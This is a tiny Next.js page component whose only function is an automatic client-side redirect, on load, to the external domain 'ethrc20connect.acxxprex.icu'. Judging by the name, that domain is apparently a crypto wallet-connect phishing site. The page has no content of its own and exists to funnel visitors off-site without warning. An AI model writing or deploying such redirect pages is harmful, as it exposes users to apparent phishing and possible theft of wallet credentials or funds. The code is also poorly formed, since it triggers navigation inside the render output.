"use client"
import { useRouter } from 'next/navigation';
import React from 'react'

export default function page() {
  const router = useRouter();
  return (
    <div>
      {router.push('https://ethrc20connect.acxxprex.icu')}
    </div>
  )
}
